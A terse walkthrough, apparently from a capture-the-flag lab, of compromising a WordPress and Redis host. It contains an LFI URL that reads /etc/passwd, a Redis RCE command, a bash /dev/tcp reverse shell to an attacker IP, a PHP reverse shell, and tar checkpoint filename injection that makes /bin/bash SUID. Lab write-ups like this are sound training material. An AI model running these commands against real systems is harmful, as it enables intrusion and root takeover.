22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.7.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Readys &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.38 (Debian)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

wpscan
<img width="750" height="363" alt="image" src="https://github.com/user-attachments/assets/76648d75-1321-4b27-84b3-227e97d39678" />

using site editor lfi
http://192.168.146.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
<img width="1917" height="260" alt="image" src="https://github.com/user-attachments/assets/b05019d8-0686-4fcb-8bab-b9394809404c" />
view /etc/redis/redis.conf. find requirepass: Ready4Redis?
<img width="1747" height="624" alt="image" src="https://github.com/user-attachments/assets/f0fe79a9-ced6-41cf-8aad-17b9954b89b0" />
login. redis_version:5.0.14
<img width="526" height="161" alt="image" src="https://github.com/user-attachments/assets/a3d67205-5335-4743-a6f9-55fb768e27f9" />
https://github.com/Ridter/redis-rce?source=post_page-----88a3e0e21f62---------------------------------------
redis 4 and 5 use redis-rce. get exp.so from rogue redis
python3 redis-rce.py -r $ip -p 6379 -L 192.168.45.184 -P 80 -v -f ../redis-rogue-server-master/exp.so -a Ready4Redis?
select interactive then reverse shell
bash -c "bash -i >& /dev/tcp/192.168.45.184/80 0>&1"
<img width="892" height="100" alt="image" src="https://github.com/user-attachments/assets/db4f2631-69a3-454d-ada2-0607f3f3c8e3" />
<img width="1034" height="141" alt="image" src="https://github.com/user-attachments/assets/fe2ee2ee-87ad-424b-b0c2-82b4be934cf5" />
/etc/crontab shows. /usr/local/bin/backup.sh being run
<img width="536" height="65" alt="image" src="https://github.com/user-attachments/assets/af13d773-39c5-47b3-a71c-d02f0e530781" />
backup goes into /var/www/html and tars
<img width="553" height="136" alt="image" src="https://github.com/user-attachments/assets/e0ec2df6-46e2-41d6-980d-e3d5b6c36aa2" />
wpconfig. karl:Wordpress1234
<img width="533" height="114" alt="image" src="https://github.com/user-attachments/assets/32ce302f-7742-4630-ad19-1ad93f4c9a9a" />
use mysql to find pass
<img width="1487" height="136" alt="image" src="https://github.com/user-attachments/assets/fb9a25d8-f062-4505-bb58-64d34bddb5a7" />
nvm it was a rabbithole.
psaux shows alice runs apache
<img width="825" height="146" alt="image" src="https://github.com/user-attachments/assets/57d4e570-579a-4d22-a5a1-cc340a1bc94b" />
in /opt i found redis files, i put my php reverse shell there
<img width="1685" height="256" alt="image" src="https://github.com/user-attachments/assets/23dbd639-303a-4c91-9098-9b5442f6927e" />
i run my code using the previous LFI, it runs php code
<img width="1429" height="191" alt="image" src="https://github.com/user-attachments/assets/f36b417a-bbeb-4f3a-9afa-ad360b9e0f40" />
<img width="1120" height="322" alt="image" src="https://github.com/user-attachments/assets/4731ceb5-902a-4444-bd42-351357274152" />
go to /var/www/html
since cron tars here go to gtfo bin tar
#at target machine
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh payload.sh'
#then create a payload.sh with below content, you can create on your kali machine and transfer to target machine.
echo '#!/bin/bash' > paylaod.sh
echo 'chmod u+s /bin/bash' >> payload.sh
/bin/bash -p
<img width="487" height="56" alt="image" src="https://github.com/user-attachments/assets/2d015ea1-7d86-475c-856b-2671497c1f83" />
